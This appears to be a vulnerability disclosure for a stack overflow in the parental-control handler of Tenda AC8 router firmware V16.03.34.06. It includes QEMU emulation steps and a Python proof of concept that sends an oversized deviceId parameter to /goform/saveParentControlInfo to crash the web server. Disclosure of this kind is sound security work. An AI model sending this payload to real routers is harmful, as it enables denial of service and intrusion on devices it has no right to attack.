get_parentControl_list_Info 栈溢出
-------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站：[https://www.tenda.com.cn/material/show/103518](https://www.tenda.com.cn/material/show/103518)

### Affected version

**V16.03.34.06**

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

qemu start command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

### Vulnerability details

Tenda AC8V4.0-V16.03.34.06 be discovered to contain a stack overflow via the deviceid parameter in the get\_parentControl\_list\_Info function.
![image](https://github.com/user-attachments/assets/c917cda1-c4fa-4c92-ab1b-f1af1cde1d3f)



Call chain : saveParentControlInfo -> saveParentControlInfo -> get\_parentControl\_list\_Info

### poc

Because saveParentControlInfo calls get\_parentControl\_list\_Info, But there are actually two different stack overflow triggers in saveParentControlInfo and get\_parentControl\_list\_Info

```text-plain
import requests

IP = "192.168.142.100"
url = f"http://{IP}/goform/saveParentControlInfo?"
url += "deviceId=deviceid"+ "R" * 0x300
url += "&enable=enable"
url += "&time=time"
url += "&url_enable=url_enable"
url += "&urls=urls"
url += "&day=day"
url += "&block=block"

response = requests.get(url)
print(response.content)
```
![image](https://github.com/user-attachments/assets/fd40fc46-527c-4175-8e00-38fddec43ad0)

